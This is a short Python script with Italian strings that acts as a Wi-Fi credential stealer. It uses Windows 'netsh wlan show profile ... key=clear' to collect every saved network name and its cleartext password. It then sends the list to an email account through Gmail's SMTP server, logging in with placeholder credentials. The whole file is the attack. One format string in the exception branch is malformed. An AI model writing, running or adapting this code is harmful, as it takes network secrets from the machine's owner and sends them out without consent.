import smtplib
import subprocess

contenuto = " "

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "Tutti i profili utente" in i]
for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i , 'key=clear']).decode('utf-8', 'ignore').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Contenuto chiave" in b]
    try:
        contenuto += "{:<30}|  {:<}".format(i, results[0]) + "\n"
    except IndexError:
        contenuto += "{:<30}|  {:<".format(i, "") + "\n"

EmailLogin = "LatuaEmail"
Passwordlogin = "Lapassworddellatuaemail"

oggetto = "Subject: Lista Password \n\n"


messaggio = oggetto + contenuto

email = smtplib.SMTP("smtp.gmail.com", 587)

email.ehlo()
email.starttls()
email.login(EmailLogin, Passwordlogin)

email.sendmail(EmailLogin, EmailLogin, messaggio)
email.quit()
        
